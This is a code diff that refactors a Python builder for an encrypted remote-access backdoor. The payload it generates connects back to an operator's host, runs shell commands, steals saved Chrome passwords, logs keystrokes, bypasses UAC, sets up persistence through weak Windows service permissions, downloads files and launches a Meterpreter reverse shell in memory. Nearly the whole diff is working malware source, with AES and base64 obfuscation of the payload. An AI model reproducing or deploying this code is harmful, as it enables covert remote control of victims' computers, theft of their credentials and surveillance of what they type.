@@ -15,8 +15,8 @@ pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv, secretkey = randKey(32), randKey(16), randKey(32)
-quote = "'"
-complexcommand = quote * 3 + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + quote * 3
+triplequote = "'" * 3
+complexcommand = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
 
 part1 = '''#def fscreenshot():
 # 	hwnd = 0
@@ -128,10 +128,14 @@ def fbypass(cmd):
 
 def fsubprocess(cmd):
 	if ushell:
-		cmd = "%s -c '%s'" % (ushell, cmd)
+		cmd = "%s -c ''' + triplequote + '%s' + triplequote + '''" % (ushell, cmd)
 	out = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	return out.stdout.read() + out.stderr.read()
 
+def sendAES(data):
+	data = data + '**nEOFEOFEOFEOFEOFX'
+	encrypted = EncodeAES(cipher, data)
+	s.send(encrypted)
 
 host, port, secret = '***HOST***', ***PORT***, '***SECRET***'
 
@@ -257,11 +261,14 @@ useproxy = False               # Set to True to use the proxy.
 proxyhost = "37.187.58.37"     # Set to the hostname (IP) of the proxy.
 proxyport = 3128               # Set to the port of the proxy.
 
-if useproxy:
-	s = socks.socksocket()
-	s.setproxy(socks.HTTP,proxyhost,proxyport)
-	success = "GET / HTTP/1.1**r**n**r**n" + success
-else:
+try:
+	if useproxy:
+		s = socks.socksocket()
+		s.setproxy(socks.HTTP,proxyhost,proxyport)
+		success = "GET / HTTP/1.1**r**n**r**n" + success
+	else:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+except:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 s.connect((host, port))
@@ -313,42 +320,33 @@ while 1:
 						sendit += sendpass
 					else:
 						sendit += '**n [X] No passwords found for %s**n' % (passpath[1])
-				sendit += '**nEOFEOFEOFEOFEOFX'
-				encrypted = EncodeAES(cipher, sendit)
-				s.send(encrypted)
+				sendAES(sendit)
 			else:
-				encrypted =  EncodeAES(cipher, ' [X] Chrome, Chromium and Aviator are not installed.**nEOFEOFEOFEOFEOFX')
-				s.send(encrypted)
+				sendAES(' [X] Chrome, Chromium and Aviator are not installed.')
 		else:
-			encrypted = EncodeAES(cipher, " [X] Error: chromepass command is only available on windows.**nEOFEOFEOFEOFEOFX")
-			s.send(encrypted)
+			sendAES(" [X] Error: chromepass command is only available on windows.")
 
 	elif decrypted.startswith("keydump"):
-		encrypted = EncodeAES(cipher, "%s**nEOFEOFEOFEOFEOFX" % (keydump))
-		s.send(encrypted)
+		sendAES(keydump)
 
 	elif decrypted.startswith("keyscan"):
 		kl = threading.Thread(target = klloop)
 		kl.start()
-		encrypted = EncodeAES(cipher, " [*] Keylogging started.**nEOFEOFEOFEOFEOFX")
-		s.send(encrypted)
+		sendAES(" [*] Keylogging started.")
 
 	elif decrypted.startswith("keyclear"):
-		encrypted = EncodeAES(cipher, "%s**n [*] Keybuffer cleared.**nEOFEOFEOFEOFEOFX" % (keydump))
-		s.send(encrypted)
+		sendAES("%s**n [*] Keybuffer cleared." % (keydump))
 		keydump = ''
 
 	elif decrypted.startswith("meterpreter "):
 		try:
 			mhost,mport = decrypted.split(' ')[1].split(':')
 			MeterBin = MeterDrop(mhost, mport)
-			encrypted = EncodeAES(cipher, " [*] Meterpreter reverse_tcp sent to %s:%s**nEOFEOFEOFEOFEOFX" % (mhost, mport))
-			s.send(encrypted)
+			sendAES(" [*] Meterpreter reverse_tcp sent to %s:%s" % (mhost, mport))
 			t = threading.Thread(target = ExecInMem, args = (MeterBin , ))
 			t.start()
 		except:
-			encrypted = EncodeAES(cipher, " [X] Failed to load meterpreter!**n  usage e.g: meterpreter 192.168.1.20 4444**nEOFEOFEOFEOFEOFX")
-			s.send(encrypted)
+			sendAES(" [X] Failed to load meterpreter!**n  usage e.g: meterpreter 192.168.1.20 4444")
 
 	elif decrypted.startswith("persistence"):
 		if os.name == 'nt':
@@ -387,13 +385,11 @@ while 1:
 						if out.find("BUILTIN" + os.sep + "Users:(I)(F)") != -1 or out.find("BUILTIN" + os.sep + "Users:(F)") != -1:
 							vulnpaths += line + '**n'
 				if vulnpaths:
-					encrypted = EncodeAES(cipher, " [*] Windows services with weak directory permissions:**n**n%sEOFEOFEOFEOFEOFX" % (vulnpaths))
+					sendAES(" [*] Windows services with weak directory permissions:**n**n%s" % (vulnpaths))
 				else:
-					encrypted = EncodeAES(cipher, " [X] No services with weak directory permissions found.**nEOFEOFEOFEOFEOFX")
-				s.send(encrypted)
+					sendAES(" [X] No services with weak directory permissions found.")
 		else:
-			encrypted = EncodeAES(cipher, " [X] Persistence is only available for windows.**nEOFEOFEOFEOFEOFX")
-			s.send(encrypted)
+			sendAES(" [X] Persistence is only available for windows.")
 
 	elif decrypted.startswith("bypassuac "):
 		cmds = ' '.join(decrypted.split(' ')[1:])
@@ -414,10 +410,9 @@ while 1:
 		try:
 			url = decrypted.split(' ')[1]
 			Wget(url)
-			encrypted = EncodeAES(cipher, " [*] %s downloaded.**nEOFEOFEOFEOFEOFX" % (url.split('/')[-1]))
+			sendAES(" [*] %s downloaded." % (url.split('/')[-1]))
 		except:
-			encrypted = EncodeAES(cipher, " [X] Could not download %s.**nEOFEOFEOFEOFEOFX" % (url))
-		s.send(encrypted)
+			sendAES(" [X] Could not download %s." % (url))
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):													## Data starting with this code indicates we are to receive a file
 		try:
@@ -432,18 +427,15 @@ while 1:
 				else:
 					f.write(decrypted)
 			f.close()
-			encrypted = EncodeAES(cipher, " [*] File uploaded to %s**nEOFEOFEOFEOFEOFX" % (ufilename))
-			s.send(encrypted)
+			sendAES(" [*] File uploaded to %s" % (ufilename))
 		except Exception as e:
-			encrypted = EncodeAES(cipher, " [*] Something went wrong: %s**nEOFEOFEOFEOFEOFX" % (e))
-			s.send(encrypted)
+			sendAES(" [*] Something went wrong: %s" % (e))
 
 	elif decrypted.startswith('run '):
 		cmd = 'cd ' + pwd + '&&' + ' '.join(decrypted.split(' ')[1:]) 
 		t = threading.Thread(target = frunthis, args = (cmd , ))
 		t.start()
-		encrypted = EncodeAES(cipher, ' [*] Executed "' + ' '.join(decrypted.split(' ')[1:]) + '" in ' + pwd + '**nEOFEOFEOFEOFEOFX')
-		s.send(encrypted)
+		sendAES(' [*] Executed "' + ' '.join(decrypted.split(' ')[1:]) + '" in ' + pwd)
 
 	else:
 		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)												## This is how we maintain pwd
@@ -453,15 +445,14 @@ while 1:
 			if '[X]' not in checkpath and '[*]' not in checkpath:
 				if checkpath:
 					if isWindows:
-						if '\\\\' in checkpath.strip('**r'):
+						if os.sep in checkpath.strip('**r'):
 							pwd = checkpath
 					else:
-						if checkpath.find(':') == -1:
+						if checkpath.find(':') == -1 and os.sep in checkpath:
 							pwd = checkpath
 
-		result = '**n'.join(stdout.split('**n')[:-1]) + '**nEOFEOFEOFEOFEOFX'
-		encrypted = EncodeAES(cipher, result)
-		s.send(encrypted)
+		result = '**n'.join(stdout.split('**n')[:-1])
+		sendAES(result)
 
 s.close()
 '''
@@ -492,7 +483,11 @@ encrypted = EncodeAES(cipherEnc, readyscript)
 b64var = randVar()
 aesvar = 'AES'
 f.write('''#!/usr/bin/env python
-import subprocess,platform,socket,base64,os,struct,socket,socks,urllib2,binascii,ctypes,time,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
+import subprocess,platform,socket,base64,os,struct,socket,urllib2,binascii,ctypes,time,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
+try:
+	import socks
+except:
+	pass
 try:
 	import win32api,win32gui,win32file,win32console,win32crypt,pyHook,pythoncom,win32con
 except:
@@ -724,7 +719,7 @@ while True:
 			f.close()
 			fnextcmd()
 		except Exception as e:
-			print " [*] Something went wrong: %s**nEOFEOFEOFEOFEOFX" % (e)
+			print " [*] Something went wrong: %s**n" % (e)
 			fnextcmd()
 
 	elif decrypted[28:32] == 'WTF1':							## Print the output of bypassuac commands
